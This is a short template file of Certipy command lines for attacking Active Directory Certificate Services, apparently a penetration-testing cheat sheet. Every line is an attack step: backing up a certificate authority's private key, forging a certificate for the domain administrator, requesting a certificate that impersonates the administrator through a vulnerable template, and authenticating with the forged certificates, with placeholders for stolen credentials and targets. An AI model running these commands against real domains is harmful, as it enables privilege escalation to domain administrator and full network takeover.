commands.template:
certipy-ad ca -backup -u {username}@{domain} -p {password} -ca {ca_name} -target {dc_ip}

certipy-ad forge -ca-pfx '{ca_pfx_file}' -upn administrator@{domain}

certipy-ad auth -pfx administrator_forged.pfx -dc-ip {dc_ip}

certipy-ad find -u <username> -p <password> -dc-ip {dc_ip} -vulnerable -enabled

certipy-ad req -ca {ca_name} -dc-ip {dc_ip} -u {username} -p '{password}' -template User -target {domain} -upn administrator@{domain}

certipy-ad auth -pfx administrator.pfx
